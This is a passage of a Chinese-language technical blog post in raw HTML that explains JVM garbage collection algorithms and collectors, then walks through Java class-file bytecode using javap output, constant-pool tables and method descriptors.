src=\"https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbaa6eg9j217a0ggta0.jpg\" alt=\"image-20220222151708141\"></p>\n<p>那么它是如何运作的呢？</p>\n<p>首先，所有新创建的对象，在一开始都会进入到新生代的Eden区（如果是大对象会被直接丢进老年代），在进行新生代区域的垃圾回收时，首先会对所有新生代区域的对象进行扫描，并回收那些不再使用对象：</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbyo48r0j21i20cqq4l.jpg\" alt=\"image-20220222153104582\"></p>\n<p>接着，在一次垃圾回收之后，Eden区域没有被回收的对象，会进入到Survivor区。在一开始From和To都是空的，而GC之后，所有Eden区域存活的对象都会直接被放入到From区，最后From和To会发生一次交换，也就是说目前存放我们对象的From区，变为To区，而To区变为From区：</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbyn34yfj21gk0d4gn5.jpg\" alt=\"image-20220222154032674\"></p>\n<p>接着就是下一次垃圾回收了，操作与上面是一样的，不过这时由于我们From区域中已经存在对象了，所以，在Eden区的存活对象复制到From区之后，所有To区域中的对象会进行年龄判定（每经历一轮GC年龄<code>+1</code>，如果对象的年龄大于<code>默认值为15</code>，那么会直接进入到老年代，否则移动到From区）</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24egy1gzmc6v1nzcj21h60d2q4l.jpg\" alt=\"image-20220222154828416\"></p>\n<p>最后像上面一样交换To区和From区，之后不断重复以上步骤。</p>\n<p>而垃圾收集也分为：</p>\n<ul>\n<li><p>Minor GC   -   次要垃圾回收，主要进行新生代区域的垃圾收集。</p>\n<ul>\n<li>触发条件：新生代的Eden区容量已满时。</li>\n</ul>\n</li>\n<li><p>Major GC   -   主要垃圾回收，主要进行老年代的垃圾收集。</p>\n</li>\n<li><p>Full GC      -    完全垃圾回收，对整个Java堆内存和方法区进行垃圾回收。</p>\n<ul>\n<li>触发条件1：每次晋升到老年代的对象平均大小大于老年代剩余空间</li>\n<li>触发条件2：Minor GC后存活的对象超过了老年代剩余空间</li>\n<li>触发条件3：永久代内存不足（JDK8之前）</li>\n<li>触发条件4：手动调用<code>System.gc()</code>方法</li>\n</ul>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzml30209wj21u80ren3q.jpg\" alt=\"image-20220222205605690\"></p>\n</li>\n</ul>\n<h5 id=\"标记-清除算法\"><a href=\"#标记-清除算法\" class=\"headerlink\" title=\"标记-清除算法\"></a>标记-清除算法</h5><p>前面我们已经了解了整个堆内存实际上是以分代收集机制为主，但是依然没有讲到具体的收集过程，那么，具体的回收过程又是什么样的呢？首先我们来了解一下最古老的<code>标记-清除</code>算法。</p>\n<p>首先标记出所有需要回收的对象，然后再依次回收掉被标记的对象，或是标记出所有不需要回收的对象，只回收未标记的对象。实际上这种算法是非常基础的，并且最易于理解的（这里对象我就以一个方框代替了，当然实际上存放是我们前说到的GC Roots形式）</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24egy1gzme6btluwj21e40c0760.jpg\" alt=\"image-20220222165709034\"></p>\n<p>虽然此方法非常简单，但是缺点也是非常明显的 ，首先如果内存中存在大量的对象，那么可能就会存在大量的标记，并且大规模进行清除。并且一次标记清除之后，连续的内存空间可能会出现许许多多的空隙，碎片化会导致连续内存空间利用率降低。</p>\n<h5 id=\"标记-复制算法\"><a href=\"#标记-复制算法\" class=\"headerlink\" title=\"标记-复制算法\"></a>标记-复制算法</h5><p>既然标记清除算法在面对大量对象时效率低，那么我们可以采用标记-复制算法。它将容量分为同样大小的两块区域，</p>\n<p>标记复制算法，实际上就是将内存区域划分为大小相同的两块区域，每次只使用其中的一块区域，每次垃圾回收结束后，将所有存活的对象全部复制到另一块区域中，并一次性清空当前区域。虽然浪费了一些时间进行复制操作，但是这样能够很好地解决对象大面积回收后空间碎片化严重的问题。</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzmlh5aveqj21ti0u079c.jpg\" alt=\"image-20220222210942507\"></p>\n<p>这种算法就非常适用于新生代（因为新生代的回收效率极高，一般不会留下太多的对象）的垃圾回收，而我们之前所说的新生代Survivor区其实就是这个思路，包括8:1:1的比例也正是为了对标记复制算法进行优化而采取的。</p>\n<h5 id=\"标记-整理算法\"><a href=\"#标记-整理算法\" class=\"headerlink\" title=\"标记-整理算法\"></a>标记-整理算法</h5><p>虽然标记-复制算法能够很好地应对新生代高回收率的场景，但是放到老年代，它就显得很鸡肋了。我们知道，一般长期都回收不到的对象，才有机会进入到老年代，所以老年代一般都是些钉子户，可能一次GC后，仍然存留很多对象。而标记复制算法会在GC后完整复制整个区域内容，并且会折损50%的区域，显然这并不适用于老年代。</p>\n<p>那么我们能否这样，在标记所有待回收对象之后，不急着去进行回收操作，而是将所有待回收的对象整齐排列在一段内存空间中，而需要回收的对象全部往后丢，这样，前半部分的所有对象都是无需进行回收的，而后半部分直接一次性清除即可。</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzmm4g8voxj21vm08ywhj.jpg\" alt=\"image-20220222213208681\"></p>\n<p>虽然这样能保证内存空间充分使用，并且也没有标记复制算法那么繁杂，但是缺点也是显而易见的，它的效率比前两者都低。甚至，由于需要修改对象在内存中的位置，此时程序必须要暂停才可以，在极端情况下，可能会导致整个程序发生停顿（被称为“Stop The World”）。</p>\n<p>所以，我们可以将标记清除算法和标记整理算法混合使用，在内存空间还不是很凌乱的时候，采用标记清除算法其实是没有多大问题的，当内存空间凌乱到一定程度后，我们可以进行一次标记整理算法。</p>\n<h4 id=\"各种垃圾收集器-只讲部分具有代表性的\"><a href=\"#各种垃圾收集器-只讲部分具有代表性的\" class=\"headerlink\" title=\"各种垃圾收集器 (只讲部分具有代表性的)\"></a>各种垃圾收集器 (只讲部分具有代表性的)</h4><h5 id=\"Serial\"><a href=\"#Serial\" class=\"headerlink\" title=\"Serial\"></a>Serial</h5><p>这款垃圾收集器也是元老级别的收集器了，在JDK1.3.1之前，是虚拟机新生代区域收集器的唯一选择。这是一款单线程的垃圾收集器，也就是说，当开始进行垃圾回收时，需要暂停所有的线程，直到垃圾收集工作结束。它的新生代收集算法采用的是标记复制算法，老年代采用的是标记整理算法。</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzn92k8ooej21ae0bc75m.jpg\" alt=\"image-20220223104605648\"></p>\n<p>可以看到，当进入到垃圾回收阶段时，所有的用户线程必须等待GC线程完成工作，就相当于你打一把游戏，中途每隔1分钟网络就卡5秒钟，这确实让人难以接受。</p>\n<p>虽然缺点很明显，但是优势也是显而易见的：</p>\n<ol>\n<li>设计简单而高效。</li>\n<li>在用户的桌面应用场景中，内存一般不大，可以在较短时间内完成垃圾收集，只要不频繁发生，使用串行回收器是可以接受的。</li>\n</ol>\n<h5 id=\"ParNew\"><a href=\"#ParNew\" class=\"headerlink\" title=\"ParNew\"></a>ParNew</h5><p>这款垃圾收集器相当于是Serial收集器的多线程版本，它能够支持多线程垃圾收集：</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzn9vbvb0mj21c20c00uc.jpg\" alt=\"image-20220223111344962\"></p>\n<p>除了多线程支持以外，其他内容基本与Serial收集器一致，并且目前某些JVM默认的服务端模式新生代收集器就是使用的ParNew收集器。</p>\n<h5 id=\"CMS\"><a href=\"#CMS\" class=\"headerlink\" title=\"CMS\"></a>CMS</h5><p>在JDK1.5，HotSpot推出了一款在强交互应用中几乎可认为有划时代意义的垃圾收集器：CMS（Concurrent-Mark-Sweep）收集器，这款收集器是HotSpot虚拟机中第一款真正意义上的并发（注意这里的并发和之前的并行是有区别的，并发可以理解为同时运行用户线程和GC线程，而并行可以理解为多条GC线程同时工作）收集器，它第一次实现了让垃圾收集线程与用户线程同时工作。</p>\n<p>它主要采用标记清除算法：</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gznamys2bdj21as0co404.jpg\" alt=\"image-20220223114019381\"></p>\n<p>它的垃圾回收分为4个阶段：</p>\n<ul>\n<li>初始标记（需要暂停用户线程）：这个阶段的主要任务仅仅只是标记出GC Roots能直接关联到的对象，速度比较快，不用担心会停顿太长时间。</li>\n<li>并发标记：从GC Roots的直接关联对象开始遍历整个对象图的过程，这个过程耗时较长但是不需要停顿用户线程，可以与垃圾收集线程一起并发运行。</li>\n<li>重新标记（需要暂停用户线程）：由于并发标记阶段可能某些用户线程会导致标记产生变得，因此这里需要再次暂停所有线程进行并行标记，这个时间会比初始标记时间长一丢丢。</li>\n<li>并发清除：最后就可以直接将所有标记好的无用对象进行删除，因为这些对象程序中也用不到了，所以可以与用户线程并发运行。</li>\n</ul>\n<p>虽然它的优点非常之大，但是缺点也是显而易见的，我们之前说过，标记清除算法会产生大量的内存碎片，导致可用连续空间逐渐变少，长期这样下来，会有更高的概率触发Full GC，并且在与用户线程并发执行的情况下，也会占用一部分的系统资源，导致用户线程的运行速度一定程度上减慢。</p>\n<p>不过，如果你希望的是最低的GC停顿时间，这款垃圾收集器无疑是最佳选择，不过自从G1收集器问世之后，CMS收集器不再推荐使用了。</p>\n<h5 id=\"Garbage-First-JDK9\"><a href=\"#Garbage-First-JDK9\" class=\"headerlink\" title=\"Garbage First (JDK9+)\"></a>Garbage First (JDK9+)</h5><p>此垃圾收集器也是一款划时代的垃圾收集器，在JDK7的时候正式走上历史舞台，它是一款主要面向于服务端的垃圾收集器，并且在JDK9时，取代了JDK8默认的 Parallel Scavenge + Parallel Old 的回收方案。</p>\n<p>我们知道，我们的垃圾回收分为<code>Minor GC</code>、<code>Major GC </code>和<code>Full GC</code>，它们分别对应的是新生代，老年代和整个堆内存的垃圾回收，而G1收集器巧妙地绕过了这些约定，它将整个Java堆划分成<code>2048</code>个大小相同的独立<code>Region</code>块，每个<code>Region块</code>的大小根据堆空间的实际大小而定，整体被控制在1MB到32MB之间，且都为2的N次幂。所有的<code>Region</code>大小相同，且在JVM的整个生命周期内不会发生改变。</p>\n<p>那么分出这些<code>Region</code>有什么意义呢？每一个<code>Region</code>都可以根据需要，自由决定扮演哪个角色（Eden、Survivor和老年代），收集器会根据对应的角色采用不同的回收策略。此外，G1收集器还存在一个Humongous区域，它专门用于存放大对象（一般认为大小超过了Region容量一半的对象为大对象）这样，新生代、老年代在物理上，不再是一个连续的内存区域，而是到处分布的。</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gznc9jvdzdj21f40eiq4g.jpg\" alt=\"image-20220223123636582\"></p>\n<p>它的回收过程与CMS大体类似：</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gznc8vqqqij21h00emwgt.jpg\" alt=\"image-20220223123557871\"></p>\n<p>分为以下四个步骤：</p>\n<ul>\n<li>初始标记（暂停用户线程）：仅仅只是标记一下GC Roots能直接关联到的对象，并且修改TAMS指针的值，让下一阶段用户线程并发运行时，能正确地在可用的Region中分配新对象。这个阶段需要停顿线程，但耗时很短，而且是借用进行Minor GC的时候同步完成的，所以G1收集器在这个阶段实际并没有额外的停顿。</li>\n<li>并发标记：从GC Root开始对堆中对象进行可达性分析，递归扫描整个堆里的对象图，找出要回收的对象，这阶段耗时较长，但可与用户程序并发执行。</li>\n<li>最终标记（暂停用户线程）：对用户线程做一个短暂的暂停，用于处理并发标记阶段漏标的那部分对象。</li>\n<li>筛选回收：负责更新Region的统计数据，对各个Region的回收价值和成本进行排序，根据用户所期望的停顿时间来制定回收计划，可以自由选择任意多个Region构成回收集，然后把决定回收的那一部分Region的存活对象复制到空的Region中，再清理掉整个旧Region的全部空间。这里的操作涉及存活对象的移动，是必须暂停用户线程，由多个收集器线程并行完成的。</li>\n</ul>\n<h5 id=\"Shenandoah-amp-ZGC-低延迟\"><a href=\"#Shenandoah-amp-ZGC-低延迟\" class=\"headerlink\" title=\"Shenandoah &amp; ZGC (低延迟)\"></a>Shenandoah &amp; ZGC (低延迟)</h5><p>专为低延迟场景特化的垃圾收集器，论综合表现可能比不上G1，但他们暂停线程的时间比G1还要短得多。适合一些对GC延迟有特殊要求的特殊场景。具体不想介绍了，有兴趣可以课下了解，他们的几乎整个工作过程都是并发的，工作原理蛮有意思的。</p>\n<h2 id=\"字节码\"><a href=\"#字节码\" class=\"headerlink\" title=\"字节码\"></a>字节码</h2><p>终于写到这里了，我最想讲的就是这个，这个也最好玩:D</p>\n<h3 id=\"什么是字节码\"><a href=\"#什么是字节码\" class=\"headerlink\" title=\"什么是字节码\"></a>什么是字节码</h3><p>众所周知，Java是一门跨平台语言，只要能跑JVM的平台都能运行同一份Jar包。而Jar包其实本质上就是一堆class文件和一些资源文件打包放到一个压缩包里罢了，我们也可以直接运行class文件。那么class文件里面有什么内容呢？肯定不可能是机器码吧，如果是机器码要怎么跨平台？答案就是字节码。Kotlin之所以兼容Java，也是因为它是把kt文件编译成字节码，而Java和Kotlin之间的相互调用其实就是字节码之间的调用。JVM内置字节码解释器，在运行时动态解释字节码文件，把字节码翻译成对应平台的机器码运行。</p>\n<h3 id=\"类文件的基础结构\"><a href=\"#类文件的基础结构\" class=\"headerlink\" title=\"类文件的基础结构\"></a>类文件的基础结构</h3><p>Class文件是一组以8个字节为基础单位的二进制流，当遇到需要占用8个字节以上空间的数据项时，则会按照高位在前的方式分割成若干个8个字节进行存储。Class文件使用一种类似于C语言结构体的伪结构来存储数据，这种伪结构中只有两种数据类型: <strong>无符号数</strong>, <strong>表</strong>。后面的解析都以这两种数据类型为基础。</p>\n<p>我们先来看一段示例代码</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">TestClazz</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">int</span> b <span class=\"token operator\">=</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> a<span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token function\">sum</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> <span class=\"token function\">sum</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> b<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"execute sum function.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> a <span class=\"token operator\">+</span> b<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>我们用<code>javap -verbose</code> 指令将它编译并解码为我们肉眼可以观测的字节码</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Classfile /D:/project/android/ksp-learn/test/build/classes/java/main/kim/bifrost/rain/ksp/TestClazz.class\n  Last modified 2022-7-9; size 754 bytes\n  MD5 checksum 2b38afaa297c7960c988943b0c475282\n  Compiled from \"TestClazz.java\"\npublic class kim.bifrost.rain.ksp.TestClazz\n  minor version: 0\n  major version: 52\n  flags: ACC_PUBLIC, ACC_SUPER\nConstant pool:\n   #1 = Methodref          #8.#27         // java/lang/Object.\"&lt;init&gt;\":()V\n   #2 = Fieldref           #28.#29        // java/lang/System.out:Ljava/io/PrintStream;\n   #3 = Methodref          #7.#30         // kim/bifrost/rain/ksp/TestClazz.sum:(II)I\n   #4 = Methodref          #31.#32        // java/io/PrintStream.println:(I)V\n   #5 = String             #33            // execute sum function.\n   #6 = Methodref          #31.#34        // java/io/PrintStream.println:(Ljava/lang/String;)V\n   #7 = Class              #35            // kim/bifrost/rain/ksp/TestClazz\n   #8 = Class              #36            // java/lang/Object\n   #9 = Utf8               &lt;init&gt;\n  #10 = Utf8               ()V\n  #11 = Utf8               Code\n  #12 = Utf8               LineNumberTable\n  #13 = Utf8               LocalVariableTable\n  #14 = Utf8               this\n  #15 = Utf8               Lkim/bifrost/rain/ksp/TestClazz;\n  #16 = Utf8               main\n  #17 = Utf8               ([Ljava/lang/String;)V\n  #18 = Utf8               args\n  #19 = Utf8               [Ljava/lang/String;\n  #20 = Utf8               a\n  #21 = Utf8               I\n  #22 = Utf8               b\n  #23 = Utf8               sum\n  #24 = Utf8               (II)I\n  #25 = Utf8               SourceFile\n  #26 = Utf8               TestClazz.java\n  #27 = NameAndType        #9:#10         // \"&lt;init&gt;\":()V\n  #28 = Class              #37            // java/lang/System\n  #29 = NameAndType        #38:#39        // out:Ljava/io/PrintStream;\n  #30 = NameAndType        #23:#24        // sum:(II)I\n  #31 = Class              #40            // java/io/PrintStream\n  #32 = NameAndType        #41:#42        // println:(I)V\n  #33 = Utf8               execute sum function.\n  #34 = NameAndType        #41:#43        // println:(Ljava/lang/String;)V\n  #35 = Utf8               kim/bifrost/rain/ksp/TestClazz\n  #36 = Utf8               java/lang/Object\n  #37 = Utf8               java/lang/System\n  #38 = Utf8               out\n  #39 = Utf8               Ljava/io/PrintStream;\n  #40 = Utf8               java/io/PrintStream\n  #41 = Utf8               println\n  #42 = Utf8               (I)V\n  #43 = Utf8               (Ljava/lang/String;)V\n{\n  public kim.bifrost.rain.ksp.TestClazz();\n    descriptor: ()V\n    flags: ACC_PUBLIC\n    Code:\n      stack=1, locals=1, args_size=1\n         0: aload_0\n         1: invokespecial #1                  // Method java/lang/Object.\"&lt;init&gt;\":()V\n         4: return\n      LineNumberTable:\n        line 10: 0\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0       5     0  this   Lkim/bifrost/rain/ksp/TestClazz;\n\n  public static void main(java.lang.String[]);\n    descriptor: ([Ljava/lang/String;)V\n    flags: ACC_PUBLIC, ACC_STATIC\n    Code:\n      stack=3, locals=3, args_size=1\n         0: iconst_1\n         1: istore_1\n         2: iconst_2\n         3: iload_1\n         4: iadd\n         5: istore_2\n         6: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;\n         9: iload_1\n        10: iload_2\n        11: invokestatic  #3                  // Method sum:(II)I\n        14: invokevirtual #4                  // Method java/io/PrintStream.println:(I)V\n        17: return\n      LineNumberTable:\n        line 12: 0\n        line 13: 2\n        line 14: 6\n        line 15: 17\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0      18     0  args   [Ljava/lang/String;\n            2      16     1     a   I\n            6      12     2     b   I\n}\nSourceFile: \"TestClazz.java\"<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"魔数-amp-Class文件版本\"><a href=\"#魔数-amp-Class文件版本\" class=\"headerlink\" title=\"魔数 &amp; Class文件版本\"></a>魔数 &amp; Class文件版本</h4><p>class文件的前4个Byte被称为魔数(Magic Number), 这些魔数的意义在于标识class文件。在类的加载阶段会根据这头四个Byte判断是否是合法的class文件。魔数的选取也颇有历史渊源<code>0xCAFE BABE</code>，Java的创始人十分喜欢咖啡:)。</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/aZx0S4EjfY.jpg\" alt=\"aZx0S4EjfY\"></p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220709-173350.jpg\" alt=\"飞书20220709-173350\"></p>\n<p>随后第四个字节，也就是7列存储着字节码的版本号。这里是34，从16进制翻译过来就是52，对应着Java8的字节码版本。</p>\n<p>第5和第6个字节是次版本号（Minor Version）,第7，8个字节是主版本号（Major Version）。Java是版本号是从45开始，JDK1.1之后的每个JDK大版本发布主版本号向上+1，高版本的JDK能向下兼容以前版本的Class文件，而不能运行以后版本的Class文件。</p>\n<h4 id=\"常量池\"><a href=\"#常量池\" class=\"headerlink\" title=\"常量池\"></a>常量池</h4><p>即</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Constant pool:\n   #1 = Methodref          #8.#27         // java/lang/Object.\"&lt;init&gt;\":()V\n   #2 = Fieldref           #28.#29        // java/lang/System.out:Ljava/io/PrintStream;\n   #3 = Methodref          #7.#30         // kim/bifrost/rain/ksp/TestClazz.sum:(II)I\n   #4 = Methodref          #31.#32        // java/io/PrintStream.println:(I)V\n   #5 = String             #33            // execute sum function.\n   #6 = Methodref          #31.#34        // java/io/PrintStream.println:(Ljava/lang/String;)V\n   #7 = Class              #35            // kim/bifrost/rain/ksp/TestClazz\n   #8 = Class              #36            // java/lang/Object\n   #9 = Utf8               &lt;init&gt;\n  #10 = Utf8               ()V\n  #11 = Utf8               Code\n  #12 = Utf8               LineNumberTable\n  #13 = Utf8               LocalVariableTable\n  #14 = Utf8               this\n  #15 = Utf8               Lkim/bifrost/rain/ksp/TestClazz;\n  #16 = Utf8               main\n  #17 = Utf8               ([Ljava/lang/String;)V\n  #18 = Utf8               args\n  #19 = Utf8               [Ljava/lang/String;\n  #20 = Utf8               a\n  #21 = Utf8               I\n  #22 = Utf8               b\n  #23 = Utf8               sum\n  #24 = Utf8               (II)I\n  #25 = Utf8               SourceFile\n  #26 = Utf8               TestClazz.java\n  #27 = NameAndType        #9:#10         // \"&lt;init&gt;\":()V\n  #28 = Class              #37            // java/lang/System\n  #29 = NameAndType        #38:#39        // out:Ljava/io/PrintStream;\n  #30 = NameAndType        #23:#24        // sum:(II)I\n  #31 = Class              #40            // java/io/PrintStream\n  #32 = NameAndType        #41:#42        // println:(I)V\n  #33 = Utf8               execute sum function.\n  #34 = NameAndType        #41:#43        // println:(Ljava/lang/String;)V\n  #35 = Utf8               kim/bifrost/rain/ksp/TestClazz\n  #36 = Utf8               java/lang/Object\n  #37 = Utf8               java/lang/System\n  #38 = Utf8               out\n  #39 = Utf8               Ljava/io/PrintStream;\n  #40 = Utf8               java/io/PrintStream\n  #41 = Utf8               println\n  #42 = Utf8               (I)V\n  #43 = Utf8               (Ljava/lang/String;)V<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>紧接着主次版本号之后的是常量池入口，常量池可以比喻为Class文件里的资源仓库，它是Class文件结构中与其他项目关联最多的数据。</p>\n<p>首先上来就会有一个1字节的无符号数，它用于表示当前常量的类型（常量类型有很多个）这里只列举一部分的类型介绍：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">类型</th>\n<th align=\"center\">标志</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">CONSTANT_Utf8_info</td>\n<td align=\"center\">1</td>\n<td align=\"center\">UTF-8编码格式的字符串</td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_Integer_info</td>\n<td align=\"center\">3</td>\n<td align=\"center\">整形字面量（第一章我们演示的很大的数字，实际上就是以字面量存储在常量池中的）</td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_Class_info</td>\n<td align=\"center\">7</td>\n<td align=\"center\">类或接口的符号引用</td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_String_info</td>\n<td align=\"center\">8</td>\n<td align=\"center\">字符串类型的字面量</td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_Fieldref_info</td>\n<td align=\"center\">9</td>\n<td align=\"center\">字段的符号引用</td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_Methodref_info</td>\n<td align=\"center\">10</td>\n<td align=\"center\">方法的符号引用</td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_MethodType_info</td>\n<td align=\"center\">16</td>\n<td align=\"center\">方法类型</td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_NameAndType_info</td>\n<td align=\"center\">12</td>\n<td align=\"center\">字段或方法的部分符号引用</td>\n</tr>\n</tbody></table>\n<p>实际上这些东西，虽然我们不知道符号引用是什么东西，我们可以观察出来，这些东西或多或少都是存放类中一些名称、数据之类的东西。</p>\n<p>比如我们来看第一个<code>CONSTANT_Methodref_info</code>表中存放了什么数据，这里我只列出它的结构表（详细的结构表可以查阅《深入理解Java虚拟机 第三版》中222页总表）：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">常量</th>\n<th align=\"center\">项目</th>\n<th align=\"center\">类型</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">CONSTANT_Methodref_info</td>\n<td align=\"center\">tag</td>\n<td align=\"center\">u1</td>\n<td align=\"center\">值为10</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">index</td>\n<td align=\"center\">u2</td>\n<td align=\"center\">指向声明方法的类描述父CONSTANT_Class_info索引项</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">index</td>\n<td align=\"center\">u2</td>\n<td align=\"center\">指向名称及类型描述符CONSTANT_NameAndType_info索引项</td>\n</tr>\n</tbody></table>\n<p>再看看它指向的<code>CONSTANT_Class_info</code>和<code>CONSTANT_NameAndType_info</code>的结构</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">常量</th>\n<th align=\"center\">项目</th>\n<th align=\"center\">类型</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">CONSTANT_Class_info</td>\n<td align=\"center\">tag</td>\n<td align=\"center\">u1</td>\n<td align=\"center\">值为7</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">index</td>\n<td align=\"center\">u2</td>\n<td align=\"center\">指向全限定名常量项的索引</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th align=\"center\">常量</th>\n<th align=\"center\">项目</th>\n<th align=\"center\">类型</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">CONSTANT_NameAndType_info</td>\n<td align=\"center\">tag</td>\n<td align=\"center\">u1</td>\n<td align=\"center\">值为12</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">index</td>\n<td align=\"center\">u2</td>\n<td align=\"center\">指向字段或方法名称常量项的索引</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">index</td>\n<td align=\"center\">u2</td>\n<td align=\"center\">指向字段或方法描述符常量项的索引</td>\n</tr>\n</tbody></table>\n<h5 id=\"方法标识符\"><a href=\"#方法标识符\" class=\"headerlink\" title=\"方法标识符\"></a>方法标识符</h5><p>再说一下方法标识符，我们先找到sum方法的NameAndType常量</p>\n<blockquote>\n<p>#30 = NameAndType        #23:#24        // sum:(II)I</p>\n</blockquote>\n<p>我们会发现这里已经为我们标识出来了，#23对应<code>sum</code>，也就是方法名称。#24对应<code>(II)I</code>即方法标识符。</p>\n<p>那么这个(II)I有什么意思呢，括号内的两个I代表该方法有两个int类型的形参，括号后面的I代表该方法的返回值是int类型。</p>\n<p>至于不同类型的修饰符，我贴一个表在下面:</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzno2stssaj216i08mjsr.jpg\" alt=\"image-20220223192518999\"></p>\n<p>构造器的标识符为<code>()V</code>，即一个无形参，返回值为void类型的方法。</p>\n<p>再举几个例子:</p>\n<blockquote>\n<p>public Set<arathothattribute> getAttrInstSet()</arathothattribute></p>\n<p>()Ljava/util/Set&lt;ink/rainbowbridge/v1/arathoth/attribute/abstracts/ArathothAttribute;&gt;;</p>\n<p>如你所见，泛型并不会在编译时被擦除，只会在运行时</p>\n<p>所以我们可以在运行时通过草字节码的方式获得一个已经被擦除的泛型</p>\n</blockquote>\n<blockquote>\n<p>public Double getRandom(Double value1, Double 